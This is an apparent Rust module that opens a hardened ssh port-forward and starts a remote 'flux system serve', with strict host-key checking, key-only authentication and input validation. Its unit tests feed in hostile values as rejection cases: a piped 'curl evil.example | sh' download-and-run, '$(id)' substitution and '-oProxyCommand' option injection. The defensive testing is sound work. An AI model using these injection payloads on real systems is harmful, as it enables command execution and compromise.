//! The ssh bootstrap for a served substrate (Decision 0018 rule 3, C-683).
//!
//! **ssh is the bootstrap, never the substrate.** Nothing here maps a guarded operation onto
//! `ssh <cmd>`: the only thing that crosses the link as a command is one pinned invocation of the
//! far machine's own flux binary asking it to *serve the remote protocol*, and one port-forward.
//! Every effect afterwards rides the delivered protocol through that forward — bearer auth,
//! version negotiation, the guarded port, handshake admission — exactly as a `remote` binding does.
//! Mapping effects onto raw remote commands would substitute prose-over-ssh for the far side's own
//! capability enforcement, which is the thing that makes a substrate trustworthy.
//!
//! What this module owns is the local half: the pinned argv the ssh *client* is spawned with, the
//! live handle that keeps the forward open exactly as long as the substrate that rides it, and the
//! typed refusals. The client is an OS process like any other, so it goes through
//! [`System::spawn_background`] — argv-only, cleared environment, workspace-pinned cwd. The state
//! machine that composes this with the protocol handshake lives one layer up, where the client is.
//!
//! Three postures are pinned in [`SshPlan::forward_argv`] and are not options:
//!
//! - **Strict host-key checking, and a refusal is a refusal.** `StrictHostKeyChecking=yes` with
//!   `BatchMode=yes`: an unknown or changed host key ends the bootstrap with a named error. There
//!   is no prompt to answer and no `-o StrictHostKeyChecking=no` anywhere in this file.
//! - **The key is a reference.** What the credential resolves to is a *path*; flux never reads the
//!   material. `IdentitiesOnly=yes` means the declared key is the only one offered, and every
//!   interactive authentication method is off — there is no face here that asks a human anything.
//! - **No ambient session state.** `-F none` means neither the per-user nor the system-wide ssh
//!   config is read, and agent forwarding, X11 and connection multiplexing are off — so the
//!   `[[host]]` entry is the whole of what the tunnel does, with nothing inherited from a file the
//!   binding never named.

use std::fmt;
use std::net::SocketAddr;
use std::sync::Mutex;
use std::time::{Duration, Instant};

use crate::net::{BindExposure, InboundLimits};
use crate::port::GuardedNetwork;
use crate::{ManagedChild, System};

/// The default far-side port `flux system serve` binds, mirroring the CLI's own default.
pub const DEFAULT_SERVE_PORT: u16 = 8790;

/// The default sshd port.
const DEFAULT_SSH_PORT: u16 = 22;

/// How long the local end of the forward is given to come up before the bootstrap gives up on the
/// ssh client. Bounded so a filtered address fails rather than hangs.
const FORWARD_READY_TIMEOUT: Duration = Duration::from_secs(20);

/// How often the local end is retried while the client is still alive.
const POLL_INTERVAL: Duration = Duration::from_millis(100);

/// The characters a far-side word may contain. The far side's *login shell* re-parses the command
/// ssh carries, so anything it could re-interpret is refused here rather than quoted — a quoting
/// scheme is a thing to get wrong, and none of these paths has a legitimate reason to need one.
fn is_shell_safe(word: &str) -> bool {
    !word.is_empty()
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "._/@:+-=".contains(c))
}

/// A local argv word that must not be mistaken for an ssh option or a second argument.
fn is_argv_safe(word: &str) -> bool {
    !word.is_empty()
        && !word.starts_with('-')
        && !word.contains(char::is_whitespace)
        && !word.contains('\0')
}

/// Why an ssh bootstrap could not produce a served substrate. Typed, because each face asks the
/// operator for a different fix and the surface renders them as distinct refusals.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SshRefusal {
    /// The binding itself is not usable: a malformed target, or a declared far-side word the far
    /// side's shell would re-interpret.
    Declaration(String),
    /// The private key the credential reference resolves to is not there.
    NoKey { path: String, detail: String },
    /// No sshd answered: refused, unresolvable, or timed out.
    Unreachable { target: String, detail: String },
    /// The far side's host key is not the one on record. A mismatch **refuses**; it never prompts.
    HostKeyMismatch { target: String, detail: String },
    /// sshd answered and declined the key. Every interactive fallback is off by construction.
    AuthRefused { target: String, detail: String },
    /// The declared far-side flux binary is not at that path (or not on `PATH`).
    NoFarSideBinary { binary: String, detail: String },
    /// Nothing is serving the remote protocol on the far side and this binding cannot start one.
    NotServing { target: String, detail: String },
    /// A serve was started but never became admissible within the bounded wait.
    StartTimeout { target: String, detail: String },
}

impl fmt::Display for SshRefusal {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Declaration(detail) => write!(f, "ssh binding is not usable: {detail}"),
            Self::NoKey { path, detail } => {
                write!(f, "ssh key `{path}` is not usable: {detail}")
            }
            Self::Unreachable { target, detail } => {
                write!(f, "ssh could not reach `{target}`: {detail}")
            }
            Self::HostKeyMismatch { target, detail } => write!(
                f,
                "ssh refused `{target}`: its host key is not the one on record — {detail}. \
                 Verification is strict and a mismatch is never prompted through; reconcile the \
                 known_hosts record deliberately"
            ),
            Self::AuthRefused { target, detail } => write!(
                f,
                "sshd on `{target}` refused the declared key: {detail}. Interactive authentication \
                 is off by construction — there is no password face to fall back to"
            ),
            Self::NoFarSideBinary { binary, detail } => write!(
                f,
                "the far side has no flux binary at `{binary}`: {detail}. Installing it is the \
                 operator's step; this binding only starts or attaches to what is already there"
            ),
            Self::NotServing { target, detail } => write!(
                f,
                "nothing is serving the remote protocol on `{target}`: {detail}"
            ),
            Self::StartTimeout { target, detail } => write!(
                f,
                "`flux system serve` on `{target}` did not become admissible in time: {detail}"
            ),
        }
    }
}

impl std::error::Error for SshRefusal {}

/// Where sshd is: `ssh://user@host[:port]`.
///
/// `user@host` is a **username**, not a credential — the credential is the key, and it stays a
/// reference. A password in the authority (`user:pass@host`) is refused, exactly as it is for every
/// other binding's url.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SshTarget {
    /// The far-side login name.
    pub user: String,
    /// The far-side host or address.
    pub host: String,
    /// The sshd port.
    pub port: u16,
}

impl SshTarget {
    /// Parse `ssh://user@host[:port]`. The scheme is optional so a bare `user@host` also reads.
    pub fn parse(url: &str) -> Result<Self, SshRefusal> {
        let refuse = |detail: &str| {
            SshRefusal::Declaration(format!("`{url}` is not an ssh target: {detail}"))
        };
        let rest = url.strip_prefix("ssh://").unwrap_or(url).trim();
        if rest.contains('/') {
            return Err(refuse("an ssh target is `user@host[:port]` with no path"));
        }
        let (user, hostport) = rest
            .rsplit_once('@')
            .ok_or_else(|| refuse("it names no login user (`user@host`)"))?;
        if user.contains(':') {
            return Err(refuse(
                "it embeds a password; an ssh binding authenticates by key, and the key is a \
                 credential reference",
            ));
        }
        let (host, port) = match hostport.rsplit_once(':') {
            Some((host, port)) => (
                host,
                port.parse::<u16>()
                    .map_err(|e| refuse(&format!("port `{port}` is not a port ({e})")))?,
            ),
            None => (hostport, DEFAULT_SSH_PORT),
        };
        if !is_argv_safe(user) || !is_argv_safe(host) {
            return Err(refuse(
                "the user and host must be bare words that cannot be read as ssh options",
            ));
        }
        Ok(Self {
            user: user.to_string(),
            host: host.to_string(),
            port,
        })
    }

    /// The operator-facing `user@host:port` form, for a refusal to name.
    pub fn display(&self) -> String {
        format!("{}@{}:{}", self.user, self.host, self.port)
    }
}

/// A resolved ssh bootstrap: everything the local half needs, with every credential already reduced
/// to a *path* or held by the caller. No secret value lives here.
#[derive(Debug, Clone)]
pub struct SshPlan {
    /// Where sshd is.
    pub target: SshTarget,
    /// The private key path the credential reference resolved to.
    pub key_path: String,
    /// The far-side flux binary (`flux` when the binding declares none).
    pub binary: String,
    /// The far-side loopback port the serve binds and the forward lands on.
    pub serve_port: u16,
    /// The far-side workspace root a started serve is given.
    pub workspace: Option<String>,
    /// The far-side TLS certificate/key a started serve is given. Absent means attach-only.
    pub cert: Option<String>,
    /// The far-side TLS key; see [`cert`](Self::cert).
    pub key: Option<String>,
    /// A local `known_hosts` file scoping strict verification to this binding.
    pub known_hosts: Option<String>,
    /// The environment-variable name the token is handed to the far side under, when the binding's
    /// token reference is an env one. Never the value — that travels in the child's environment.
    pub token_env: Option<String>,
    /// How long a started serve is given to become admissible.
    pub start_timeout: Duration,
}

impl SshPlan {
    /// Refuse a plan whose far-side words the login shell could re-interpret, before anything is
    /// spawned or connected. The far side re-parses what ssh carries, so this is the only place the
    /// argv-only guarantee can be kept for it.
    pub fn validate(&self) -> Result<(), SshRefusal> {
        for (what, word) in [
            ("the far-side binary", Some(self.binary.as_str())),
            ("the far-side workspace", self.workspace.as_deref()),
            ("the far-side certificate", self.cert.as_deref()),
            ("the far-side key", self.key.as_deref()),
            ("the far-side token variable", self.token_env.as_deref()),
        ] {
            let Some(word) = word else { continue };
            if !is_shell_safe(word) {
                return Err(SshRefusal::Declaration(format!(
                    "{what} `{word}` contains characters the far side's login shell would \
                     re-interpret; declare a plain path"
                )));
            }
        }
        for (what, word) in [
            ("the private key path", Some(self.key_path.as_str())),
            ("the known_hosts path", self.known_hosts.as_deref()),
        ] {
            let Some(word) = word else { continue };
            if !is_argv_safe(word) {
                return Err(SshRefusal::Declaration(format!(
                    "{what} `{word}` cannot be passed as an argument; it must be a bare path that \
                     cannot be read as an ssh option"
                )));
            }
        }
        Ok(())
    }

    /// The pinned options every ssh invocation of this binding carries. Order matters:
    /// `ClearAllForwardings` comes before any `-L` so it clears what a config file contributed
    /// without clearing what this binding declared.
    fn pinned_options(&self) -> Vec<String> {
        // The binding is the whole declaration: `-F none` skips both the per-user and the
        // system-wide ssh config, so what the tunnel does is what the `[[host]]` entry says and
        // nothing an unrelated file contributes. A jump host or a cipher preference has to be
        // declared, not inherited.
        let mut argv: Vec<String> = vec!["-F".to_string(), "none".to_string()];
        let mut option = |value: &str| {
            argv.push("-o".to_string());
            argv.push(value.to_string());
        };
        // Never prompt: a question with no one to answer it is a refusal, not a pause.
        option("BatchMode=yes");
        // A mismatched or unknown host key ends the bootstrap. This is the invariant, not a default.
        option("StrictHostKeyChecking=yes");
        // Every interactive credential face is off; the declared key is the only one offered.
        option("PasswordAuthentication=no");
        option("KbdInteractiveAuthentication=no");
        option("NumberOfPasswordPrompts=0");
        option("PubkeyAuthentication=yes");
        option("IdentitiesOnly=yes");
        // No ambient session state: no agent to borrow, no multiplexed socket to inherit or leave
        // behind, no terminal. Forwardings need no separate clearing — `-F none` above means no
        // config file contributed one, and `ClearAllForwardings` is applied *after* the whole
        // command line, so setting it would clear this binding's own `-L` as well.
        option("ForwardAgent=no");
        option("ForwardX11=no");
        option("ControlMaster=no");
        option("ControlPath=none");
        option("RequestTTY=no");
        // A dead link becomes a dead child, so the state machine sees it rather than hanging.
        option("ServerAliveInterval=15");
        option("ServerAliveCountMax=3");
        option("ExitOnForwardFailure=yes");
        if let Some(known_hosts) = &self.known_hosts {
            option(&format!("UserKnownHostsFile={known_hosts}"));
        }
        argv.push("-i".to_string());
        argv.push(self.key_path.clone());
        argv.push("-p".to_string());
        argv.push(self.target.port.to_string());
        argv.push("-l".to_string());
        argv.push(self.target.user.clone());
        argv
    }

    /// The port-forward invocation: no remote command at all (`-N`), one loopback-to-loopback
    /// forward, and nothing else. The forward is the *only* one this session carries, because
    /// `-F none` means nothing else could have declared one.
    pub fn forward_argv(&self, local_port: u16) -> Vec<String> {
        let mut argv = vec!["ssh".to_string(), "-N".to_string()];
        argv.extend(self.pinned_options());
        argv.push("-L".to_string());
        argv.push(format!(
            "127.0.0.1:{local_port}:127.0.0.1:{}",
            self.serve_port
        ));
        argv.push(self.target.host.clone());
        argv
    }

    /// The one command that ever crosses the link: the far machine's own flux binary, asked to
    /// serve the remote protocol on its loopback. It binds loopback because the forward is meant to
    /// be the only ingress.
    ///
    /// `None` when the binding declares no certificate and key — such a binding may attach to a
    /// serve the operator runs, and may not start one, because the protocol serves TLS and there is
    /// no plaintext face to fall back to.
    pub fn serve_argv(&self) -> Option<Vec<String>> {
        let (cert, key) = (self.cert.as_ref()?, self.key.as_ref()?);
        let mut argv = vec!["ssh".to_string()];
        argv.extend(self.pinned_options());
        if let Some(token_env) = &self.token_env {
            argv.push("-o".to_string());
            argv.push(format!("SendEnv={token_env}"));
        }
        argv.push(self.target.host.clone());
        argv.push(self.binary.clone());
        argv.push("system".to_string());
        argv.push("serve".to_string());
        argv.push("--bind".to_string());
        argv.push(format!("127.0.0.1:{}", self.serve_port));
        argv.push("--cert".to_string());
        argv.push(cert.clone());
        argv.push("--key".to_string());
        argv.push(key.clone());
        if let Some(workspace) = &self.workspace {
            argv.push("--workspace".to_string());
            argv.push(workspace.clone());
        }
        if let Some(token_env) = &self.token_env {
            argv.push("--token-env".to_string());
            argv.push(token_env.clone());
        }
        Some(argv)
    }

    /// The endpoint the delivered remote client is pointed at once the forward is up.
    pub fn endpoint(&self, server_name: &str, local_port: u16) -> String {
        format!("https://{server_name}:{local_port}")
    }
}

/// A live ssh child and what it has said so far.
///
/// Held behind a mutex because reading a child's output and asking whether it is still running both
/// mutate the handle, while the substrate that depends on it is shared.
pub struct SshChild {
    child: Mutex<ManagedChild>,
    transcript: Mutex<String>,
    what: &'static str,
}

impl SshChild {
    fn new(child: ManagedChild, what: &'static str) -> Self {
        Self {
            child: Mutex::new(child),
            transcript: Mutex::new(String::new()),
            what,
        }
    }

    /// Drain whatever the client has said since the last look and answer whether it is still alive.
    fn poll(&self) -> bool {
        let mut child = self.child.lock().unwrap();
        let (out, err) = child.read_output();
        if !out.is_empty() || !err.is_empty() {
            let mut transcript = self.transcript.lock().unwrap();
            transcript.push_str(&out);
            transcript.push_str(&err);
        }
        child.status().running
    }

    /// Everything the child has said, capped by the guarded spawn path's own output cap.
    pub fn transcript(&self) -> String {
        self.poll();
        self.transcript.lock().unwrap().trim().to_string()
    }

    /// Whether the child is still running.
    pub fn is_alive(&self) -> bool {
        self.poll()
    }

    /// What an exited ssh client's own words mean, as a typed refusal. Classification is by the
    /// stable phrases OpenSSH emits for each face; an unrecognized one stays `Unreachable` with the
    /// transcript attached rather than being guessed into a more specific claim.
    pub fn diagnose(&self, target: &SshTarget) -> SshRefusal {
        let transcript = self.transcript();
        let said = transcript.to_ascii_lowercase();
        let detail = if transcript.is_empty() {
            format!(
                "the ssh client exited without saying why ({} session)",
                self.what
            )
        } else {
            transcript.clone()
        };
        if said.contains("host key verification failed")
            || said.contains("remote host identification has changed")
            || said.contains("no matching host key")
        {
            SshRefusal::HostKeyMismatch {
                target: target.display(),
                detail,
            }
        } else if said.contains("permission denied") || said.contains("too many authentication") {
            SshRefusal::AuthRefused {
                target: target.display(),
                detail,
            }
        } else if said.contains("no such identity") || said.contains("bad permissions") {
            SshRefusal::NoKey {
                path: String::new(),
                detail,
            }
        } else {
            SshRefusal::Unreachable {
                target: target.display(),
                detail,
            }
        }
    }
}

/// The live local end of an ssh bootstrap: the forward, and the serve session it may have started.
///
/// Its lifetime **is** the substrate's. The remote system that rides this forward holds it, so the
/// tunnel outlives every request made through it and not one moment longer — dropping the substrate
/// drops this, and [`ManagedChild`]'s own `Drop` kills the client.
pub struct SshTunnel {
    forward: SshChild,
    serve: Mutex<Option<SshChild>>,
    local_port: u16,
    target: SshTarget,
}

/// The tunnel is what the remote substrate rides on, so the substrate owns it: dropping the system
/// drops this, and [`ManagedChild`]'s `Drop` kills both ssh clients.
impl crate::remote::TransportLifeline for SshTunnel {}

impl SshTunnel {
    /// Spawn the forward through the guarded process path and wait, bounded, for its local end to
    /// accept a connection. A client that dies first is diagnosed from its own words.
    pub async fn open(
        system: &System,
        plan: &SshPlan,
        local_port: u16,
    ) -> Result<Self, SshRefusal> {
        plan.validate()?;
        let argv = plan.forward_argv(local_port);
        let child =
            system
                .spawn_background(&argv, &[])
                .map_err(|error| SshRefusal::Unreachable {
                    target: plan.target.display(),
                    detail: format!("the ssh client could not be started: {error}"),
                })?;
        let tunnel = Self {
            forward: SshChild::new(child, "forward"),
            serve: Mutex::new(None),
            local_port,
            target: plan.target.clone(),
        };

        let deadline = Instant::now() + FORWARD_READY_TIMEOUT;
        loop {
            if local_end_accepts(local_port).await {
                return Ok(tunnel);
            }
            if !tunnel.forward.is_alive() {
                return Err(tunnel.forward.diagnose(&plan.target));
            }
            if Instant::now() >= deadline {
                return Err(SshRefusal::Unreachable {
                    target: plan.target.display(),
                    detail: format!(
                        "the forward never came up within {}s; the client said: {}",
                        FORWARD_READY_TIMEOUT.as_secs(),
                        redact_empty(&tunnel.forward.transcript())
                    ),
                });
            }
            tokio::time::sleep(POLL_INTERVAL).await;
        }
    }

    /// The local port the delivered remote client connects to.
    pub fn local_port(&self) -> u16 {
        self.local_port
    }

    /// Whether the forward is still up.
    pub fn is_alive(&self) -> bool {
        self.forward.is_alive()
    }

    /// The forward's own words, for a refusal to quote.
    pub fn transcript(&self) -> String {
        self.forward.transcript()
    }

    /// Diagnose the forward client, for a caller that saw the link fail.
    pub fn diagnose(&self) -> SshRefusal {
        self.forward.diagnose(&self.target)
    }

    /// Start `flux system serve` on the far machine over a second ssh session, holding it for this
    /// tunnel's lifetime.
    ///
    /// Idempotent by construction rather than by lock: the far side's `--bind` **is** the mutex. A
    /// second local session that starts a serve while one is already listening loses the bind and
    /// its child exits; both sessions then attach to the one serve through the standard handshake.
    /// Nothing here reserves, locks or reaps a far-side process.
    pub fn start_serve(
        &self,
        system: &System,
        plan: &SshPlan,
        token: Option<(String, String)>,
    ) -> Result<(), SshRefusal> {
        let Some(argv) = plan.serve_argv() else {
            return Err(SshRefusal::NotServing {
                target: plan.target.display(),
                detail: format!(
                    "nothing answers on the far side's 127.0.0.1:{}, and this binding declares no \
                     `cert`/`key` to start one with — the protocol serves TLS and has no plaintext \
                     face. Either run `flux system serve` there, or declare the far-side \
                     certificate and key",
                    plan.serve_port
                ),
            });
        };
        // The token reaches the far side through the ssh channel's environment, never through argv:
        // an argument is visible in the far side's process table to every user on that machine.
        let env: Vec<(String, String)> = token.into_iter().collect();
        let child =
            system
                .spawn_background(&argv, &env)
                .map_err(|error| SshRefusal::Unreachable {
                    target: plan.target.display(),
                    detail: format!("the ssh client could not be started: {error}"),
                })?;
        *self.serve.lock().unwrap() = Some(SshChild::new(child, "serve"));
        Ok(())
    }

    /// What the started serve session has said, if one was started.
    pub fn serve_transcript(&self) -> Option<String> {
        self.serve
            .lock()
            .unwrap()
            .as_ref()
            .map(SshChild::transcript)
    }

    /// Whether the started serve session is still running.
    pub fn serve_running(&self) -> bool {
        self.serve
            .lock()
            .unwrap()
            .as_ref()
            .is_some_and(SshChild::is_alive)
    }

    /// Diagnose a serve session that exited. The far side's shell reports a missing binary as
    /// `command not found`, which is the one face worth naming exactly: installing flux there is
    /// the operator's step, so "not installed" and "would not start" are different conversations.
    pub fn diagnose_serve(&self, plan: &SshPlan) -> SshRefusal {
        let transcript = self.serve_transcript().unwrap_or_default();
        let said = transcript.to_ascii_lowercase();
        if said.contains("command not found")
            || said.contains("no such file or directory")
            || said.contains("not found")
        {
            return SshRefusal::NoFarSideBinary {
                binary: plan.binary.clone(),
                detail: redact_empty(&transcript),
            };
        }
        if said.contains("host key verification failed") || said.contains("permission denied") {
            return self
                .serve
                .lock()
                .unwrap()
                .as_ref()
                .map(|child| child.diagnose(&plan.target))
                .unwrap_or_else(|| SshRefusal::Unreachable {
                    target: plan.target.display(),
                    detail: redact_empty(&transcript),
                });
        }
        SshRefusal::StartTimeout {
            target: plan.target.display(),
            detail: redact_empty(&transcript),
        }
    }
}

fn redact_empty(transcript: &str) -> String {
    if transcript.is_empty() {
        "it said nothing".to_string()
    } else {
        transcript.to_string()
    }
}

/// Reserve a free loopback port by binding one through the guarded network port and releasing it.
///
/// It goes through [`GuardedNetwork::bind_tcp`] rather than a raw listener because that is the one
/// reviewed native listener constructor in the tree, and a reservation is a bind like any other.
/// The window between releasing and ssh binding it is real and small; a loser gets ssh's own
/// `bind: Address already in use` as a named refusal rather than a wrong substrate.
pub async fn reserve_loopback_port(system: &System) -> Result<u16, SshRefusal> {
    let addr: SocketAddr = "127.0.0.1:0".parse().expect("a literal loopback address");
    let listener = GuardedNetwork::bind_tcp(
        system,
        addr,
        BindExposure::LoopbackOnly,
        InboundLimits::default(),
    )
    .await
    .map_err(|error| {
        SshRefusal::Declaration(format!(
            "no local port could be reserved for the forward: {error}"
        ))
    })?;
    let port = listener
        .local_addr()
        .map_err(|error| {
            SshRefusal::Declaration(format!("the reserved local port has no address: {error}"))
        })?
        .port();
    drop(listener);
    Ok(port)
}

/// Whether the forward's local end accepts a connection yet. `ssh -L` binds the local socket once
/// the session is up, so this is the readiness signal for the *client*, not for the far side —
/// what proves the far side is admissible is the protocol handshake, which the caller does next.
async fn local_end_accepts(port: u16) -> bool {
    tokio::net::TcpStream::connect(("127.0.0.1", port))
        .await
        .is_ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn plan() -> SshPlan {
        SshPlan {
            target: SshTarget::parse("ssh://build@devbox.internal:2222").unwrap(),
            key_path: "/keys/devbox".to_string(),
            binary: "/usr/local/bin/flux".to_string(),
            serve_port: DEFAULT_SERVE_PORT,
            workspace: Some("/srv/flux".to_string()),
            cert: Some("/tls/cert.pem".to_string()),
            key: Some("/tls/key.pem".to_string()),
            known_hosts: Some("/etc/flux/devbox_known_hosts".to_string()),
            token_env: Some("FLUX_REMOTE_SYSTEM_TOKEN".to_string()),
            start_timeout: Duration::from_secs(30),
        }
    }

    #[test]
    fn a_target_is_a_login_name_and_a_host_never_a_password() {
        let target = SshTarget::parse("ssh://build@devbox.internal:2222").unwrap();
        assert_eq!(target.user, "build");
        assert_eq!(target.host, "devbox.internal");
        assert_eq!(target.port, 2222);
        assert_eq!(SshTarget::parse("build@devbox").unwrap().port, 22);

        // A password in the authority is the one thing an ssh binding may never carry: it
        // authenticates by key, and the key is a reference.
        let refused = SshTarget::parse("ssh://build:hunter2@devbox").unwrap_err();
        assert!(refused.to_string().contains("password"), "{refused}");
        for bad in [
            "devbox.internal",
            "ssh://build@-oProxyCommand=x",
            "build@a b",
        ] {
            assert!(SshTarget::parse(bad).is_err(), "`{bad}` must not parse");
        }
    }

    /// The three postures the story pins, asserted on the argv itself rather than on prose about
    /// it. A future edit that adds a prompt-friendly option has to break this test to land.
    #[test]
    fn the_forward_argv_pins_strict_verification_and_offers_no_interactive_face() {
        let argv = plan().forward_argv(45_678);
        let flat = argv.join(" ");

        assert_eq!(argv[0], "ssh");
        assert!(
            argv.contains(&"-N".to_string()),
            "no remote command: {flat}"
        );
        for pinned in [
            "BatchMode=yes",
            "StrictHostKeyChecking=yes",
            "PasswordAuthentication=no",
            "KbdInteractiveAuthentication=no",
            "NumberOfPasswordPrompts=0",
            "IdentitiesOnly=yes",
            "ForwardAgent=no",
            "ControlMaster=no",
            "ControlPath=none",
            "ExitOnForwardFailure=yes",
            "UserKnownHostsFile=/etc/flux/devbox_known_hosts",
        ] {
            assert!(
                argv.contains(&pinned.to_string()),
                "missing {pinned}: {flat}"
            );
        }
        // Nothing an unrelated config file says reaches this session.
        assert!(argv.windows(2).any(|pair| pair == ["-F", "none"]), "{flat}");
        // …and the forwarding-clearing option is deliberately absent: OpenSSH applies it after the
        // whole command line, so it would clear this binding's own `-L`. `-F none` is what removes
        // the config-file forwardings it would otherwise be for.
        assert!(!flat.contains("ClearAllForwardings"), "{flat}");
        // The bypass this story exists to not have.
        assert!(
            !flat.contains("StrictHostKeyChecking=no")
                && !flat.contains("StrictHostKeyChecking=accept"),
            "{flat}"
        );
        // The key travels as a path — the thing openssh opens — never as material.
        let key_at = argv.iter().position(|a| a == "-i").expect("an identity");
        assert_eq!(argv[key_at + 1], "/keys/devbox");
        // Loopback to loopback: the forward is the only ingress either end offers.
        assert!(
            argv.contains(&format!("127.0.0.1:45678:127.0.0.1:{DEFAULT_SERVE_PORT}")),
            "{flat}"
        );
    }

    /// The only command that crosses the link is the far side's own flux, serving the protocol.
    #[test]
    fn the_only_remote_command_is_the_far_side_flux_serving_the_protocol() {
        let argv = plan().serve_argv().expect("cert and key are declared");
        let host_at = argv
            .iter()
            .position(|a| a == "devbox.internal")
            .expect("the destination");
        assert_eq!(
            &argv[host_at + 1..],
            &[
                "/usr/local/bin/flux",
                "system",
                "serve",
                "--bind",
                "127.0.0.1:8790",
                "--cert",
                "/tls/cert.pem",
                "--key",
                "/tls/key.pem",
                "--workspace",
                "/srv/flux",
                "--token-env",
                "FLUX_REMOTE_SYSTEM_TOKEN",
            ],
            "the remote command is one pinned serve invocation, never an operator's shell line"
        );
        // The token's *name* is all that appears; its value rides the channel's environment.
        assert!(argv.contains(&"SendEnv=FLUX_REMOTE_SYSTEM_TOKEN".to_string()));
        assert!(!argv.iter().any(|word| word.contains("hunter2")));
    }

    /// A binding with no far-side TLS material may attach to a serve, never start one — the
    /// protocol serves TLS and there is no plaintext face to fall back to.
    #[test]
    fn a_binding_without_far_side_tls_material_cannot_start_a_serve() {
        let attach_only = SshPlan {
            cert: None,
            key: None,
            ..plan()
        };
        assert!(attach_only.serve_argv().is_none());
    }

    /// The far side re-parses what ssh carries through its login shell, so a declared far-side word
    /// that could reach that shell is refused before anything is spawned.
    #[test]
    fn a_far_side_word_the_login_shell_would_reinterpret_is_refused() {
        for bad in [
            "/usr/local/bin/flux; curl evil.example | sh",
            "/usr/local/bin/flux $(id)",
            "/usr/local/bin/flux\nid",
        ] {
            let refusal = SshPlan {
                binary: bad.to_string(),
                ..plan()
            }
            .validate()
            .unwrap_err();
            assert!(
                refusal.to_string().contains("shell"),
                "`{bad}` must be refused by name: {refusal}"
            );
        }
        // A local path that could be read as an option is refused on the same grounds.
        let refusal = SshPlan {
            key_path: "-oProxyCommand=curl".to_string(),
            ..plan()
        }
        .validate()
        .unwrap_err();
        assert!(refusal.to_string().contains("option"), "{refusal}");
        plan().validate().expect("an ordinary plan validates");
    }

    /// Each way the bootstrap fails is a distinct face, because each asks for a different fix.
    #[test]
    fn ssh_transcripts_classify_into_distinct_refusal_faces() {
        let target = SshTarget::parse("build@devbox").unwrap();
        for (said, expect) in [
            (
                "Host key verification failed.",
                "host key is not the one on record",
            ),
            (
                "@@@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @@@",
                "host key is not the one on record",
            ),
            (
                "build@devbox: Permission denied (publickey).",
                "refused the declared key",
            ),
            (
                "ssh: connect to host devbox port 22: Connection refused",
                "could not reach",
            ),
        ] {
            let child = SshChild {
                child: Mutex::new(ManagedChild::from_handle(Silent)),
                transcript: Mutex::new(said.to_string()),
                what: "forward",
            };
            let refusal = child.diagnose(&target).to_string();
            assert!(refusal.contains(expect), "`{said}` → {refusal}");
        }
    }

    /// A stand-in for a child that has already exited, so classification can be tested without a
    /// real ssh on the machine running the tests.
    struct Silent;

    impl crate::ManagedProcess for Silent {
        fn read_output(&mut self) -> (String, String) {
            (String::new(), String::new())
        }

        fn status(&mut self) -> crate::ChildStatus {
            crate::ChildStatus {
                running: false,
                exit_code: Some(255),
            }
        }

        fn kill(&mut self) {}
    }
}
